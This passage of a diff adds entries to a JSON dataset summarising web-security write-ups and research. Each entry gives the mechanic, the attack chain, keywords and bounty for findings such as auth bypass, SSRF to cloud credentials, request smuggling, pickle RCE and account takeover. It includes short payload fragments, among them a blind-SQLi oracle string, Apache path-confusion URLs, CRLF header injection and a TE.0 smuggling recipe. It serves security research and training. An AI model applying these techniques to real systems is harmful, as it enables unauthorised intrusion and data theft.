+    "server action",
+    "40-42 hex action id",
+    "text/x-component",
+    "action has no auth of its own",
+    "ids in the bundle"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "wu-08",
+   "source_url": "https://zhero-web-sec.github.io",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "cache-poison",
+    "other"
+   ],
+   "first_signal": "`x-now-route-matches` as an externally supplied internal header, with `/_next/data/<buildId>/` as the data route",
+   "mechanic": "An internal Next.js header is trusted when supplied externally, so a data response gets cached under the HTML URL.",
+   "chain": [
+    "Send `x-now-route-matches` externally",
+    "Pair it with `/_next/data/<buildId>/` data requests",
+    "Internal header is trusted and the framework caches the wrong body: cache poisoning"
+   ],
+   "impact_proof": "Cache poisoning (CVE-2024-46982); bounty unverified.",
+   "keywords": [
+    "x-now-route-matches",
+    "/_next/data/<buildid>/",
+    "internal header trusted externally",
+    "buildid from __next_data__",
+    "framework-owned cache"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "wu-09",
+   "source_url": "https://simonkoeck blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$90,000",
+   "classes": [
+    "missing_authorization"
+   ],
+   "first_signal": null,
+   "mechanic": "An internal admin API was reachable with a normal account.",
+   "chain": [
+    "Authenticate with a normal Google account",
+    "Call the internal admin API, which does not check privilege"
+   ],
+   "impact_proof": "Not stated beyond the authorization failure; $90,000 (figure from a pre-compaction note).",
+   "keywords": [
+    "internal admin api",
+    "normal account reaches admin endpoint",
+    "authz gap",
+    "privilege not checked server-side"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "wu-10",
+   "source_url": "https://flatt.tech",
+   "set": "writeup",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "missing_authorization",
+    "api-misconfig"
+   ],
+   "first_signal": null,
+   "mechanic": "The Looker API was reachable with a lower privilege level than the UI exposes.",
+   "chain": [
+    "Authenticate as a lower-privileged user",
+    "Call the API directly instead of using the UI, which does not enforce the UI's privilege level"
+   ],
+   "impact_proof": "Rated S0 by the vendor; details not stated.",
+   "keywords": [
+    "api reachable below ui privilege",
+    "ui privilege not mirrored in api",
+    "looker",
+    "s0 severity"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "wu-11",
+   "source_url": "https://watchtowr.com",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$20,000",
+   "classes": [
+    "secret-exposure",
+    "file-upload",
+    "rce"
+   ],
+   "first_signal": null,
+   "mechanic": "A recoverable upload-signing secret plus a ZIP extractor that keeps entry filenames gives a webshell.",
+   "chain": [
+    "Recover the upload-signing secret",
+    "Sign an upload the application will accept",
+    "The ZIP extractor keeps entry filenames, so the archive writes a file where the attacker chooses",
+    "Webshell execution"
+   ],
+   "impact_proof": "Webshell on GitHub; $20,000.",
+   "keywords": [
+    "recoverable signing secret",
+    "zip extractor keeps entry filenames",
+    "signed upload forged",
+    "webshell",
+    "secret to file write to rce"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-12",
+   "source_url": "https://jeetbhdr blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$617",
+   "classes": [
+    "graphql",
+    "missing_authorization",
+    "sibling-interface"
+   ],
+   "first_signal": "The permission check exists on REST but the equivalent GraphQL mutation lacks it",
+   "mechanic": "`updateTeamsRepository` in GraphQL lacks the permission check that the REST equivalent enforces; the state change was read back to confirm.",
+   "chain": [
+    "Find the operation implemented on both REST and GraphQL",
+    "Call the GraphQL `updateTeamsRepository` mutation, which has no permission check",
+    "Read the state back to confirm the change landed"
+   ],
+   "impact_proof": "State read back after the mutation; $617.",
+   "keywords": [
+    "updateteamsrepository",
+    "check only on rest",
+    "graphql mutation lacks the check",
+    "read the state back",
+    "two interfaces one operation"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "wu-13",
+   "source_url": "https://blog.voorivex.team",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "cspt",
+    "open-redirect",
+    "info-leak"
+   ],
+   "first_signal": "The framework auto-decodes `%2f`, so a path parameter can carry slashes",
+   "mechanic": "Framework auto-decoding of `%2f` enables client-side path traversal, which is routed through a third-party redirect gadget on `/cdn-cgi/image` 307/308 to exfiltrate cross-origin.",
+   "chain": [
+    "Framework auto-decodes `%2f` in a path segment",
+    "Client-side path traversal redirects the app's own authenticated request",
+    "`/cdn-cgi/image` 307/308 third-party redirect gadget",
+    "Cross-origin exfiltration"
+   ],
+   "impact_proof": "Cross-origin exfiltration demonstrated; amount not stated.",
+   "keywords": [
+    "%2f auto-decoded",
+    "client-side path traversal",
+    "307/308 redirect gadget",
+    "/cdn-cgi/image",
+    "cross-origin exfil"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-14",
+   "source_url": "https://www.elttam.com",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "oauth",
+    "auth-bypass"
+   ],
+   "first_signal": "Auth0 default tenant configuration",
+   "mechanic": "Reflected XSS combined with the implicit grant, `prompt=none` and `POST /api/v2/users/{sub}/identities` gives persistent account takeover under Auth0 defaults.",
+   "chain": [
+    "Reflected XSS on the Auth0 default surface",
+    "Implicit grant plus `prompt=none` yields a token with no interaction",
+    "`POST /api/v2/users/{sub}/identities` links an attacker identity",
+    "Persistent account takeover"
+   ],
+   "impact_proof": "Lab PoC only.",
+   "keywords": [
+    "auth0 defaults",
+    "implicit grant",
+    "prompt=none",
+    "identity link api",
+    "/api/v2/users/{sub}/identities",
+    "persistent ato"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-15",
+   "source_url": "https://castilho blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "oauth",
+    "auth-bypass"
+   ],
+   "first_signal": "Open Dynamic Client Registration on Salesforce OAuth",
+   "mechanic": "Open Dynamic Client Registration lets an attacker register their own `redirect_uri`, which with code injection and cookie tossing yields account takeover.",
+   "chain": [
+    "Register a client through open Dynamic Client Registration",
+    "Set an attacker-controlled `redirect_uri`",
+    "Code injection plus cookie tossing",
+    "Account takeover"
+   ],
+   "impact_proof": "Account takeover; details not stated.",
+   "keywords": [
+    "dynamic client registration",
+    "attacker redirect_uri",
+    "authorization code injection",
+    "cookie tossing",
+    "salesforce oauth"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-16",
+   "source_url": "https://lauritz blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "auth-bypass"
+   ],
+   "first_signal": null,
+   "mechanic": "A catalogue of gadgets that convert an XSS into account takeover: token endpoints, profile mutation and identity link.",
+   "chain": [
+    "Obtain XSS in the application origin",
+    "Reach for a listed escalation gadget: a token endpoint, a profile mutation, or an identity-link call",
+    "Account takeover"
+   ],
+   "impact_proof": "Catalogue of escalation methods; no single target proof stated.",
+   "keywords": [
+    "xss to ato gadgets",
+    "token endpoint",
+    "profile mutation",
+    "identity link",
+    "escalation catalogue"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-17",
+   "source_url": "https://eib blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "ssrf"
+   ],
+   "first_signal": "A prefix allowlist that can be bypassed by normalization, on a fetcher that follows redirects",
+   "mechanic": "Prefix allowlist bypassed by normalization, then redirect loops make the blind SSRF readable, reaching IMDS/ECS credentials.",
+   "chain": [
+    "Bypass the prefix allowlist through URL normalization",
+    "Use redirect loops so the app's own error path prints the collected responses",
+    "Read IMDS/ECS credentials"
+   ],
+   "impact_proof": "IMDS/ECS credentials retrieved.",
+   "keywords": [
+    "prefix allowlist normalization bypass",
+    "redirect loop",
+    "blind ssrf made readable",
+    "imds",
+    "ecs credentials"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "wu-18",
+   "source_url": "https://slcyber.io",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "ssrf"
+   ],
+   "first_signal": "SSRF that follows redirects but prints nothing",
+   "mechanic": "Independent confirmation of the redirect-loop technique that makes blind SSRF readable.",
+   "chain": [
+    "Point the SSRF at an own redirect-loop server",
+    "The app's own redirect-error path dumps the collected responses"
+   ],
+   "impact_proof": "Independent confirmation of the same technique; no separate target stated.",
+   "keywords": [
+    "redirect loop ssrf",
+    "blind ssrf readable",
+    "independent confirmation",
+    "error path dumps responses"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "wu-19",
+   "source_url": "https://mll.sh",
+   "set": "writeup",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "sqli"
+   ],
+   "first_signal": null,
+   "mechanic": "Blind SQLi read with a schema oracle `' AND <col>='1` instead of sleep-based timing, with IP rotation against the rate limit.",
+   "chain": [
+    "Build a schema oracle `' AND <col>='1` rather than a sleep payload",
+    "Rotate source IPs to survive the rate limit",
+    "Extract schema and data"
+   ],
+   "impact_proof": "Rated Critical; specific data not stated.",
+   "keywords": [
+    "' and <col>='1",
+    "schema oracle instead of sleep",
+    "boolean oracle",
+    "ip rotation vs rate limit",
+    "blind sqli"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "wu-20",
+   "source_url": "https://focalsecurity blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "other",
+    "info-leak"
+   ],
+   "first_signal": "A predictable but unregistered GCP bucket name",
+   "mechanic": "Namespace squatting: register the predictable unregistered bucket name and receive cross-tenant data.",
+   "chain": [
+    "Predict the bucket name the product would use",
+    "Find it unregistered and claim it",
+    "Receive cross-tenant data"
+   ],
+   "impact_proof": "Cross-tenant data received.",
+   "keywords": [
+    "predictable bucket name",
+    "unregistered namespace",
+    "namespace squatting",
+    "cross-tenant data",
+    "gcp storage"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "wu-21",
+   "source_url": "https://slcyber.io",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "file-upload",
+    "rce"
+   ],
+   "first_signal": "`getimagesizefromstring` used without an extension check",
+   "mechanic": "Magento validates uploads with `getimagesizefromstring` and no extension check, so an image/PHP polyglot (\"polyshell\") executes.",
+   "chain": [
+    "Build a polyglot that passes `getimagesizefromstring`",
+    "Upload it with an executable extension, which is never checked",
+    "Remote code execution"
+   ],
+   "impact_proof": "RCE in Magento; details not stated.",
+   "keywords": [
+    "getimagesizefromstring",
+    "no extension check",
+    "image polyglot",
+    "polyshell",
+    "magento upload"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "wu-22",
+   "source_url": "https://blog.voorivex.team",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "file-upload",
+    "xss"
+   ],
+   "first_signal": "The `response-content-type` query parameter overriding the stored object's type at read time",
+   "mechanic": "MinIO/S3 honours the `response-content-type` query override, so a stored object is served as HTML from the storage origin.",
+   "chain": [
+    "Upload a benign-typed object to the storage origin",
+    "Read it back with the `response-content-type` query override",
+    "The object is served as HTML on the storage origin"
+   ],
+   "impact_proof": "Stored HTML served on the storage origin; impact detail not stated.",
+   "keywords": [
+    "response-content-type override",
+    "read-time content type",
+    "minio",
+    "s3 storage origin",
+    "stored html"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "wu-23",
+   "source_url": "https://cryptocat blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "medium",
+   "bounty": "$34",
+   "classes": [
+    "auth-bypass",
+    "missing_authorization"
+   ],
+   "first_signal": "A release diff showing `__return_true`",
+   "mechanic": "A trusted header: `X-Real-IP: ai-chat-bot-1` is mapped to a bot role, which can read a private admin room; the control request as a guest returned 401.",
+   "chain": [
+    "Read the release diff and spot `__return_true`",
+    "Send `X-Real-IP: ai-chat-bot-1` to get the bot role",
+    "Read the private admin room",
+    "Control: a guest without the header gets 401"
+   ],
+   "impact_proof": "Private admin room read with the header; control guest request got 401 (CVE-2026-89093, CVSS 5.3, $34).",
+   "keywords": [
+    "__return_true in a release diff",
+    "x-real-ip trusted header",
+    "bot role mapping",
+    "negative control got 401",
+    "calibration of a small finding"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "wu-24",
+   "source_url": "https://www.aikido.dev",
+   "set": "writeup",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "missing_authorization",
+    "auth-bypass",
+    "xss"
+   ],
+   "first_signal": "Whitebox review: manual escaping gaps, and a route registered after the admin middleware",
+   "mechanic": "Four ordering and second-protocol defects in NodeBB: manual escaping gaps, a route registered after the admin middleware, a signature check only on POST, and an ActivityPub outbox with no read check.",
+   "chain": [
+    "Review the source for manual escaping gaps",
+    "Find a route registered after the admin middleware, so the middleware never runs for it",
+    "Find the signature check applied only to POST",
+    "Find the ActivityPub outbox served with no read check"
+   ],
+   "impact_proof": "8 High findings in 6 hours of whitebox review.",
+   "keywords": [
+    "route registered after admin middleware",
+    "middleware ordering",
+    "signature check only on post",
+    "activitypub outbox no read check",
+    "manual escaping gaps",
+    "second protocol"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "wu-25",
+   "source_url": "https://rez0 and xssdoctor hackbot (self-reported; site and title only)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$15,000",
+   "classes": [
+    "other"
+   ],
+   "first_signal": null,
+   "mechanic": "Self-reported hackbot results: a validator agent whose job is to disprove the finding cut false positives from about 80% to about 60%.",
+   "chain": [
+    "Hackbot reports findings (126 bugs, 70% High/Critical)",
+    "A separate validator agent re-checks each one",
+    "False-positive rate drops from about 80% to about 60%"
+   ],
+   "impact_proof": "126 bugs, 70% High/Crit, top payout $15k; false positives ~80% falling to ~60% with a validator agent.",
+   "keywords": [
+    "validator agent",
+    "false positive rate 80% to 60%",
+    "hackbot",
+    "calibration",
+    "disprove the finding"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "wu-26",
+   "source_url": "https://siunam blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "other"
+   ],
+   "first_signal": null,
+   "mechanic": "CRLF injection used to control the Content-Security-Policy header and so enable XSS.",
+   "chain": [
+    "Inject CRLF into a response header",
+    "Insert or overwrite the Content-Security-Policy",
+    "Execute script that CSP would otherwise block"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "crlf injection",
+    "csp header injected",
+    "header splitting",
+    "csp bypass by control of the header"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "wu-27",
+   "source_url": "https://xssdoctor blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "cspt"
+   ],
+   "first_signal": null,
+   "mechanic": "Framework-level client-side path traversal: the framework's own request building puts user input into the API path.",
+   "chain": [
+    "Identify the framework routine that assembles API paths from user input",
+    "Insert traversal so the app's own authenticated request is rerouted"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "framework cspt",
+    "api path assembled from user input",
+    "client-side path traversal",
+    "framework request builder"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "wu-28",
+   "source_url": "https://sebsrt blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "request-smuggling",
+    "auth-bypass"
+   ],
+   "first_signal": null,
+   "mechanic": "HTTP trailers pass a HAProxy ACL that only inspects headers, so the backend sees a value the ACL never evaluated.",
+   "chain": [
+    "Place the value in an HTTP trailer rather than a header",
+    "The HAProxy ACL does not evaluate trailers",
+    "The backend reads the trailer and acts on it"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "http trailers",
+    "haproxy acl inspects headers only",
+    "trailer not evaluated by the proxy",
+    "front-end vs back-end view"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "wu-29",
+   "source_url": "https://adragos blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "info-leak",
+    "xss"
+   ],
+   "first_signal": null,
+   "mechanic": "CSS-only exfiltration: data is read out with styling alone, with no script execution.",
+   "chain": [
+    "Inject CSS without script",
+    "Use selector-driven resource loads to leak content character by character"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "css-only exfiltration",
+    "no script execution",
+    "attribute selector leak",
+    "styling as a channel"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "wu-30",
+   "source_url": "https://bugport blog (site and title only; slug lost to compaction)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "csrf",
+    "other"
+   ],
+   "first_signal": null,
+   "mechanic": "Auxclickjacking: the middle-click/auxclick path reaches a sensitive action that the normal click-jacking defences do not cover.",
+   "chain": [
+    "Set up a page where the victim's auxclick lands on the target action",
+    "The auxclick path is not covered by the usual framing defences"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "auxclick",
+    "middle click handler",
+    "ui redress variant",
+    "framing defence does not cover auxclick"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "wu-31",
+   "source_url": "https://www.elttam.com",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "filter-injection",
+    "info-leak",
+    "sqli"
+   ],
+   "first_signal": "Filter parameters that name both a field and an operator",
+   "mechanic": "ORM leaking: a user-controlled filter field and operator reach the ORM, so fields that are never meant to be searchable can be read - `email__password=~`, OData `$filter`, Prisma `[not]`.",
+   "chain": [
+    "Filter on a harmless field to get a baseline",
+    "Add an unexpected field or operator (`email__password=~`, OData `$filter`, Prisma `[not]`)",
+    "Read the oracle: result count, length, error or timing"
+   ],
+   "impact_proof": "Not stated in this note beyond the named syntaxes.",
+   "keywords": [
+    "email__password=~",
+    "odata $filter",
+    "prisma [not]",
+    "field and operator from the client",
+    "orm relational traversal",
+    "non-searchable field"
+   ],
+   "lesson": "filter-operator"
+  },
+  {
+   "id": "wu-32",
+   "source_url": "https://writeups-2025-2026 note (Flask itsdangerous item; site and title only)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "deserialization",
+    "secret-exposure",
+    "rce"
+   ],
+   "first_signal": "The signing key present in the cookie itself",
+   "mechanic": "A Flask/itsdangerous signing key recoverable from the cookie lets an attacker sign a pickle payload, giving RCE.",
+   "chain": [
+    "Recover the itsdangerous signing key from the cookie",
+    "Sign a crafted session value",
+    "The server unpickles it, giving code execution"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "itsdangerous signing key",
+    "key in the cookie",
+    "flask session pickle",
+    "signed payload forged",
+    "pickle rce"
+   ],
+   "lesson": "secret-validation"
+  },
+  {
+   "id": "wu-33",
+   "source_url": "https://writeups-2025-2026 note (JWT upn item; site and title only)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "api-misconfig"
+   ],
+   "first_signal": "The JWT `upn` claim trusted as a local username",
+   "mechanic": "The `upn` claim in a JWT is trusted as a local user, which pivots through Superset into ClickHouse.",
+   "chain": [
+    "Set the `upn` claim to a local username",
+    "The application maps the claim to that local user",
+    "Pivot through Superset into ClickHouse"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "jwt upn claim",
+    "claim trusted as local user",
+    "superset",
+    "clickhouse pivot",
+    "identity mapping from a token claim"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "wu-34",
+   "source_url": "https://writeups-2025-2026 note (FIFA item; site and title only)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "missing_authorization",
+    "auth-bypass"
+   ],
+   "first_signal": "A role guard enforced only client-side",
+   "mechanic": "The role guard exists only in the client, so the backend serves privileged functionality regardless.",
+   "chain": [
+    "Find the role check in the client bundle",
+    "Call the backend directly without it"
+   ],
+   "impact_proof": "Not stated.",
+   "keywords": [
+    "client-side-only role guard",
+    "role check in the bundle",
+    "backend still serves",
+    "ui-only enforcement"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "wu-35",
+   "source_url": "https://writeups-2025-2026 note (Microsoft Titan item; site and title only)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": "$5,000",
+   "classes": [
+    "info-leak",
+    "api-misconfig"
+   ],
+   "first_signal": "A verbose error revealing the expected parameter shape",
+   "mechanic": "A verbose error message disclosed the parameter shape the endpoint expects, which was enough to reach the finding.",
+   "chain": [
+    "Trigger the verbose error",
+    "Read the expected parameter shape out of it",
+    "Send a request in that shape"
+   ],
+   "impact_proof": "$5,000; specific impact not stated.",
+   "keywords": [
+    "verbose error",
+    "parameter shape disclosed",
+    "error message as documentation",
+    "read the error body"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "wu-36",
+   "source_url": "https://writeups-2025-2026 note (small-data calibration item; site and title only)",
+   "set": "writeup",
+   "severity": "low",
+   "bounty": "$525 and $400",
+   "classes": [
+    "info-leak"
+   ],
+   "first_signal": null,
+   "mechanic": "Calibration data point: small-data findings paid $525 and $400.",
+   "chain": [
+    "A finding whose demonstrated data is small",
+    "Payout lands in the hundreds, not the thousands"
+   ],
+   "impact_proof": "Payouts of $525 and $400 recorded as calibration.",
+   "keywords": [
+    "small data finding",
+    "payout calibration",
+    "hundreds not thousands",
+    "severity follows proof"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "wu-37",
+   "source_url": "https://writeups-2025-2026 note (phisher305 item; unverified, no vendor or date)",
+   "set": "writeup",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "saml",
+    "auth-bypass"
+   ],
+   "first_signal": "An attacker-controlled org can add a domain to its own allowed list",
+   "mechanic": "Cross-org SAML ATO: the attacker org adds the victim's domain to its own allowed list and the backend looks up the asserted email across all tenants.",
+   "chain": [
+    "Attacker org adds the victim's domain to its own allowed list",
+    "Attacker asserts the victim's email",
+    "Backend resolves the email across all tenants rather than within the asserting tenant"
+   ],
+   "impact_proof": "Not stated. Flagged unverified: no vendor, date or requests - treat as a technique lead only.",
+   "keywords": [
+    "cross-org saml",
+    "domain added to own allowed list",
+    "email looked up across all tenants",
+    "tenant-scoped lookup missing",
+    "unverified lead"
+   ],
+   "lesson": "multi-identity"
+  },
+  {
+   "id": "rs-01",
+   "source_url": "https://portswigger.net/research/http1-must-die",
+   "set": "research",
+   "severity": "critical",
+   "bounty": "$7,000 Cloudflare, $7,000 GitLab, $12,000 T-Mobile; 74 bounties / $221k on the Akamai case; over $350k total",
+   "classes": [
+    "request-smuggling",
+    "parser-differential"
+   ],
+   "first_signal": "A masked header yields a response differing from both the normal and the absent case (`Host : foo`, leading space, `Xost`); the Server banner tells which layer answered (`awselb/2.0` vs `Microsoft-HTTPAPI/2.0`); \"Mystery 400\"; a second header block leaking stripped front-end headers (`X-Nf-*`, `X-Bb-*`); 504 deadlock on HEAD; a server not treating `\\n\\n` as end-of-headers",
+   "mechanic": "V-H / H-V header-masking discrepancies make 0.CL desync exploitable through an early-response gadget, with double-desync 0.CL->CL.0 and `Expect: 100-continue` variants including the obfuscated `Expect: y 100-continue`.",
+   "chain": [
+    "Probe for a header-masking discrepancy only (HTTP Request Smuggler v3.0 permutations, Turbo Intruder `0cl-find-offset`)",
+    "Confirm with a benign controllable response such as `Location: /Logon?ReturnUrl=%2fwrtz`",
+    "Only then weaponize: early-response gadget turns 0.CL into an exploitable desync; double-desync 0.CL->CL.0"
+   ],
+   "impact_proof": "Cloudflare internal desync affecting more than 24,000,000 sites; GitLab response-queue poisoning retrieved another user's report video after 27,000 requests; Akamai CL.0 via obfuscated `Expect` served attacker content on auth.lastpass.com (CVE-2025-32094); T-Mobile staging 0.CL.",
+   "keywords": [
+    "header masking",
+    "v-h h-v discrepancy",
+    "0.cl desync",
+    "early-response gadget",
+    "expect: 100-continue",
+    "obfuscated expect",
+    "server banner tells which layer answered",
+    "mystery 400"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-02",
+   "source_url": "https://portswigger.net/research/can-ai-do-novel-security-research",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "request-smuggling",
+    "other"
+   ],
+   "first_signal": "Request-contamination detection: a baseline request with a stable response on one connection plus the candidate trigger on a separate connection - ANY change to the baseline response is a hit, with no assumption about what a poisoned response looks like",
+   "mechanic": "An autonomous four-phase research loop (ideation, evaluation, weaponization, cascade) invents desync vectors from 138 RFCs split into about 15,000 fragments yielding about 30,000 unique vectors, plus a protocol-ruler header size-limit measurement and a dangling-byte RQP that removes the stacked-response race.",
+   "chain": [
+    "Micro-inspiration: split RFC text into fragments to generate candidate vectors",
+    "Detect with the assumption-free contamination oracle on a separate connection",
+    "Second phase classifies the discrepancy (CL.0 and others) by eliciting a third distinct response",
+    "Weaponize, then cascade with a human in the loop"
+   ],
+   "impact_proof": "About 700 vulnerable targets including banks, government and an airport staff panel with flight and luggage data via F5 Big-IP; `multipart/byteranges` Content-Type as a CL.0 trigger hit more than 200 sites; dual-matching Content-Length stole a long-lived bank API key via Citrix NetScaler plus SSO compromise; 0-day CVE-2026-63078 in Apache Traffic Server; new class \"Shared-Parser Confusion\".",
+   "keywords": [
+    "request contamination oracle",
+    "baseline on a separate connection",
+    "any change is a hit",
+    "protocol ruler header size limit",
+    "dangling-byte rqp",
+    "deterministic locked judging code",
+    "fresh context per stage"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-03",
+   "source_url": "https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/",
+   "set": "research",
+   "severity": "critical",
+   "bounty": "$8,500",
+   "classes": [
+    "request-smuggling",
+    "parser-differential"
+   ],
+   "first_signal": "Google Cloud hosting with `Via: 1.1 google`; the GCP load balancer defaulting to HTTP/1.1 upstream; the IAP error \"Invalid IAP credentials: empty token\"; it worked only with `OPTIONS /` and failed on GET/POST",
+   "mechanic": "The front end honours `Transfer-Encoding: chunked` while the back end treats the body length as 0 (TE.0), the inverse of CL.0.",
+   "chain": [
+    "Send `OPTIONS /` with `TE: chunked`, keep-alive, no Content-Length, hex chunk size `50` and two blank lines after the terminating `0`, with tooling Content-Length auto-insertion off",
+    "Point the smuggled line at your own Collaborator",
+    "Confirm the back end read a zero-length body"
+   ],
+   "impact_proof": "Thousands of GCP sites; a bank's main API reached mass zero-click account takeover with live users redirected and session tokens leaked; IAP zero-trust bypass.",
+   "keywords": [
+    "te.0",
+    "options / only",
+    "via: 1.1 google",
+    "iap invalid credentials empty token",
+    "hex chunk size 50",
+    "two blank lines after terminating 0",
+    "disable content-length auto-insertion"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "rs-04",
+   "source_url": "https://blog.flomb.net/posts/http2connect/",
+   "set": "research",
+   "severity": "unknown",
+   "bounty": null,
+   "classes": [
+    "ssrf",
+    "api-misconfig"
+   ],
+   "first_signal": "ALPN `h2`/h2c; a `:status 200` HEADERS frame means the tunnel was accepted, while 503, a proxy-error DATA frame or `RST_STREAM` (`CONNECT_ERROR` on Envoy, `NO_ERROR` on Apache) mean refused",
+   "mechanic": "HTTP/2 per-stream CONNECT tunnels allow a multiplexed internal port scan over a single TLS connection.",
+   "chain": [
+    "Send the HTTP/2 preface, an empty SETTINGS frame and one HPACK HEADERS frame with `:method CONNECT` and `:authority host:port`",
+    "Read the status only and send no DATA",
+    "Multiplex streams to scan internal ports over one connection"
+   ],
+   "impact_proof": "Lab-proven tunneling and scanning against Envoy `allow_connect: true` and Apache mod_proxy_connect; no real-world target reported. Tool: github.com/fl0mb/HTTP2-CONNECT-Tunnel.",
+   "keywords": [
+    "http/2 connect",
+    "per-stream tunnel",
+    ":authority host:port",
+    "rst_stream connect_error",
+    "allow_connect: true",
+    "mod_proxy_connect",
+    "read status only"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "rs-05",
+   "source_url": "https://blog.orange.tw/posts/2024-08-confusion-attacks-en/",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "rce",
+    "lfi",
+    "parser-differential"
+   ],
+   "first_signal": "`Server: Apache` below 2.4.60 (especially Debian/Ubuntu); a RewriteRule substitution starting with a backreference (`/$1.html`); a single file protected by `<Files>` while PHP-FPM is wired through `SetHandler proxy:`; PHP via `AddType` rather than `AddHandler`; a live `/cgi-bin/` ScriptAlias; ModSecurity in front; a 400 page whose body contains raw `<?php`; `AllowEncodedSlashes On`",
+   "mechanic": "Apache modules disagree over the shared `request_rec`: filename confusion (mod_rewrite truncates at `%3F` after the regex match), DocumentRoot confusion (the path is tried with and without the docroot) and handler confusion (`r->content_type` used as the handler).",
+   "chain": [
+    "Compare `/admin.php%3Fooo.php` against a 401/403 on `/admin.php`",
+    "Try `/user/orange%2Fsecret.yml%3F` for the docroot view",
+    "Try `/html/usr/lib/cgi-bin/download.cgi%3F` against a benign /usr/share doc file",
+    "CRLF handler test `%0d%0aLocation:/ooo%0d%0aContent-Type:server-status%0d%0a%0d%0a`"
+   ],
+   "impact_proof": "Authentication and IP-restriction bypass; arbitrary file read (Redmine `secret_key.txt` into Rails deserialization RCE); PHP/CGI source disclosure; SSRF including unix sockets; PHP-FPM plus pearcmd RCE. CVE-2024-38472/38473/38474/38475/38476/38477 and CVE-2023-38709.",
